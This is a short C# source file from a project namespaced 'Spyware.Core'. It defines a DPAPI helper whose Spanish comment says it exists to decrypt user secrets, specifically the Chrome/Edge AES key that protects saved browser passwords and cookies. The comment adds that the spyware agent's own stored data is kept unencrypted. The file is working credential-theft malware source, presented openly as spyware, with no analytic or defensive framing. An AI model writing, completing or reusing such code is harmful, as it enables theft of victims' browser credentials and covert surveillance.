using System.Security.Cryptography;
using System.Text;

namespace Spyware.Core.Security;

/// <summary>
/// DPAPI solo en modo LECTURA (Unprotect) para descifrar material del usuario
/// (clave AES de Chrome/Edge, blobs legacy). No se cifra nada propio: el
/// almacenamiento local del agente queda en claro por requisito.
/// </summary>
public static class DpapiHelper
{
    public static byte[] Unprotect(byte[] protectedBlob) =>
        ProtectedData.Unprotect(protectedBlob, optionalEntropy: null, DataProtectionScope.CurrentUser);

    public static bool TryUnprotect(byte[] protectedBlob, out byte[] plain)
    {
        plain = Array.Empty<byte>();
        try
        {
            plain = Unprotect(protectedBlob);
            return plain.Length > 0;
        }
        catch (CryptographicException) { return false; }   // otro usuario / máquina distinta
        catch (Exception) { return false; }
    }

    public static bool TryUnprotectToString(byte[] protectedBlob, out string plain)
    {
        plain = string.Empty;
        if (!TryUnprotect(protectedBlob, out byte[] bytes)) return false;

        plain = Encoding.UTF8.GetString(bytes).TrimEnd('\0');
        return true;
    }
}
